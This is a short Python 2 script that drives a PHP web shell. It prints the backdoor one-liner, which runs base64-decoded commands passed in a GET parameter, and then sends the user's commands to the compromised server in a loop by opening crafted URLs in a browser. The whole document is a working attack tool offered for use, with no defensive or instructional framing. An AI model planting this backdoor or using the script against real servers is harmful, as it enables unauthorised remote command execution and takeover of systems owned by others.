#!/usr/bin/env python2
import webbrowser, base64

def main():
	print('(With backdoor = <?php shell_exec(base64_decode($_GET["cmd"]));?>)')
	url = raw_input("[!] Give URL. Injects b64encoded command at keyword 'ZZZZ'\n:> ")
	while True:
		cmd = base64.b64encode(raw_input("[!] Command?:\n:> "))
		webbrowser.open_new_tab(url.replace("ZZZZ",cmd))

if __name__=="__main__":
	main()
